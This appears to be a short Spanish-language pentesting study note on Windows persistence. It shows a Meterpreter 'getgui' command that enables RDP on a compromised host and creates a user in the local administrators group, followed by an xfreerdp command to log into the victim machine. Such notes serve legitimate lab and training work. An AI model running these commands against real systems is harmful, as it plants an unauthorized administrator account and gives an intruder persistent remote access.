# Escalación de privilegios en Windows

Tags: #Windows #PrivEsc #Meterpreter #Persistence 

## Persistencia Vía RDP

```bash 
# Crearemos un usuario desde Meterpreter siendo el usuario 'administrator'

❯ run getgui -e -u <username> -p <passwd>      # Getgui verifica si el servicio RDP esta activo, de lo contrario lo activa, el usuario que creemos sera agregado al 'local administrators group' por lo que podremos acceder al RDP

	# e = Ejecutar 
	# u = Usuario
	# p = Contraseña 


# Nos salimos de la sesion de Metasploit y hacemos lo siguiente en nuestro Kali para conectarnos por RDP
❯ xfreerdp /u:<username> /p:<passwd> /v:<IP>   # Ingresaremos de formna grafica al RDP de la maquina victima 
```